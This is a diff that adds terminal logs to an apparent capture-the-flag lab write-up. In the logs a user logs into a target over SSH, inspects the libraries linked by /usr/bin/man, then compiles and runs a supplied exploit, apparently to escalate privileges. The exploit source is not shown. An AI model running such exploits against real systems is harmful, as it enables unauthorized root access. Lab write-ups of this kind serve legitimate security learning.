@@ -72,6 +72,103 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{189}}$$-day-streak in  <a href="h
 
 <br>
 
+<pre><code>$root@[Attack_Box]:~# ssh nopriv@[Target]
+The authenticity of host '[Target] (1[Target])' can't be established.
+...
+nopriv@1[Target]'s password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+...
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+56 updates can be applied immediately.
+30 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+...
+nopriv@looneytunes:~$ ls
+exp.c  gen_libc.py
+nopriv@looneytunes:~$ 
+</code></pre>
+
+<br>
+
+<pre><code>nopriv@looneytunes:~$ ls
+exp.c  gen_libc.py
+nopriv@looneytunes:~$ ^C
+nopriv@looneytunes:~$ readelf /usr/bin/man -p .interp
+
+String dump of section '.interp':
+  [     0]  /lib64/ld-linux-x86-64.so.2
+
+nopriv@looneytunes:~$
+</code></pre>
+
+<br>
+
+<pre><code>nopriv@looneytunes:~$ ldd /usr/bin/man
+	linux-vdso.so.1 (0x00007fff21fea000)
+	libmandb-2.10.2.so => /usr/lib/man-db/libmandb-2.10.2.so (0x00007fa38ecac000)
+	libman-2.10.2.so => /usr/lib/man-db/libman-2.10.2.so (0x00007fa38ec7c000)
+	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fa38ec5a000)
+	libpipeline.so.1 => /lib/x86_64-linux-gnu/libpipeline.so.1 (0x00007fa38ec4d000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa38ea25000)
+	libgdbm.so.6 => /lib/x86_64-linux-gnu/libgdbm.so.6 (0x00007fa38ea11000)
+	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007fa38e9f1000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fa38edd6000)
+nopriv@looneytunes:~$
+</code></pre>
+
+<br>
+
+
+<pre><code>nopriv@looneytunes:~$ ldd /usr/bin/man
+	linux-vdso.so.1 (0x00007fff21fea000)
+	libmandb-2.10.2.so => /usr/lib/man-db/libmandb-2.10.2.so (0x00007fa38ecac000)
+	libman-2.10.2.so => /usr/lib/man-db/libman-2.10.2.so (0x00007fa38ec7c000)
+	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fa38ec5a000)
+	libpipeline.so.1 => /lib/x86_64-linux-gnu/libpipeline.so.1 (0x00007fa38ec4d000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa38ea25000)
+	libgdbm.so.6 => /lib/x86_64-linux-gnu/libgdbm.so.6 (0x00007fa38ea11000)
+	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007fa38e9f1000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fa38edd6000)
+nopriv@looneytunes:~$
+</code></pre>
+
+<br>
+
+<pre><code>nopriv@looneytunes:~$ ls
+exp.c  gen_libc.py
+nopriv@looneytunes:~$ gcc -o exploit exp.c
+nopriv@looneytunes:~$ ls
+exp  exp.c  exploit  gen_libc.py
+nopriv@looneytunes:~$ chmod +x exploit
+nopriv@looneytunes:~$ ./exploit
+try 100
+try 200
+try 300
+try 400
+try 500
+</code></pre>
+
+<br>
+
 
 <h2 align="center">Task 6. Conclusion<a id='5'></a></h2>
 
